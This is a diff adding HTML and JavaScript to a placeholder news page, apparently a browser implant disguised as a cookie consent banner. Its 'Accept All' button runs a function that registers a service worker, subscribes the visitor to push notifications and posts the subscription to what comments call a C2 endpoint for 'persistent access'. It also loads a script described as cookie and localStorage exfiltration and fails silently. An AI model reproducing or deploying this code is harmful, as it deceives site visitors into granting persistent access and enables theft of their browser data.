@@ -1,32 +1,105 @@
-
-
-
-
-
-
-
-
-
-NewsPortal
-
-
-Breaking News Today
-
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
-
-Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
-
-
-
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NewsPortal</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; }
+    .header { background: #1a73e8; color: white; padding: 16px 24px; font-size: 20px; font-weight: 600; }
+    .content { padding: 40px; max-width: 800px; margin: 0 auto; }
+    .content h1 { font-size: 28px; margin-bottom: 16px; color: #333; }
+    .content p { color: #666; line-height: 1.6; margin-bottom: 12px; }
+    .consent-banner {
+      position: fixed; bottom: 0; left: 0; right: 0;
+      background: white; border-top: 1px solid #ddd;
+      padding: 16px 24px; display: flex; align-items: center;
+      justify-content: space-between; box-shadow: 0 -4px 12px rgba(0,0,0,0.1);
+      z-index: 9999; gap: 16px;
+    }
+    .consent-text { font-size: 13px; color: #555; flex: 1; }
+    .consent-text a { color: #1a73e8; }
+    .btn-accept {
+      background: #1a73e8; color: white; border: none;
+      padding: 10px 24px; border-radius: 4px; cursor: pointer;
+      font-size: 14px; font-weight: 500; white-space: nowrap;
+    }
+    .btn-reject {
+      background: none; border: 1px solid #ddd; padding: 10px 16px;
+      border-radius: 4px; cursor: pointer; font-size: 14px;
+      color: #555; white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+ 
+<div class="header">NewsPortal</div>
+<div class="content">
+  <h1>Breaking News Today</h1>
+  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.</p>
+  <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident.</p>
+</div>
+ 
+<div class="consent-banner" id="banner">
+  <div class="consent-text">
     We use cookies and similar technologies to improve your experience.
     By clicking "Accept All", you consent to our use of cookies for analytics and personalized content.
-    Privacy Policy | Cookie Policy
-
-
-Reject
-
-Accept All
-
-
-
+    <a href="#">Privacy Policy</a> | <a href="#">Cookie Policy</a>
+  </div>
+  <button class="btn-reject" onclick="document.getElementById('banner').style.display='none'">Reject</button>
+  <button class="btn-accept" onclick="acceptAndImplant()">Accept All</button>
+</div>
+ 
+<script>
+// Paste your VAPID public key here (same one from server.js)
+const VAPID_PUBLIC_KEY = 'PASTE_PUBLIC_KEY_HERE';
+ 
+function urlBase64ToUint8Array(base64String) {
+  const padding = '='.repeat((4 - base64String.length % 4) % 4);
+  const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
+  const rawData = window.atob(base64);
+  return new Uint8Array([...rawData].map(c => c.charCodeAt(0)));
+}
+ 
+async function acceptAndImplant() {
+  // Hide banner immediately - looks like a normal cookie accept
+  document.getElementById('banner').style.display = 'none';
+ 
+  if (!('serviceWorker' in navigator) || !('PushManager' in window)) return;
+ 
+  try {
+    // Register SW silently
+    const reg = await navigator.serviceWorker.register('/sw.js');
+    await navigator.serviceWorker.ready;
+ 
+    // Browser shows its own native permission prompt here
+    const permission = await Notification.requestPermission();
+    if (permission !== 'granted') return;
+ 
+    // Subscribe to push
+    const subscription = await reg.pushManager.subscribe({
+      userVisibleOnly: true,
+      applicationServerKey: urlBase64ToUint8Array(VAPID_PUBLIC_KEY)
+    });
+ 
+    // Send subscription endpoint to C2 - attacker now has persistent access
+    await fetch('/subscribe', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(subscription)
+    });
+ 
+    // Load bridge for ongoing cookie/localStorage exfil
+    const s = document.createElement('script');
+    s.src = '/bridge.js';
+    document.head.appendChild(s);
+ 
+    console.log('[SleepingAgent] Implant installed');
+  } catch (err) {
+    // Fail silently
+  }
+}
+</script>
+</body>
+</html>
